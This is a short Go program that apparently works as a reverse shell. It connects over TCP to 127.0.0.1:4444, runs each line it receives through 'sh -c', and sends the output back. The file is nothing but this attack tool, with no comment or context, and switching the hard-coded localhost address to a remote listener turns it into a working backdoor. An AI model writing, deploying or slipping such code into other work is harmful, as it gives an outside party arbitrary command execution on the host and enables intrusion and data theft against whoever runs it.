package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		fmt.Println("Error connecting to the server:", err)
		return
	}
	defer conn.Close()

	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(command)
		if err != nil {
			fmt.Println("Error reading command:", err)
			return
		}

		command = strings.TrimSuffix(command, "\n")

		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("Error executing command:", err)
		}

		_, err = conn.Write(output)
		if err != nil {
			fmt.Println("Error sending output:", err)
			return
		}
	}
}
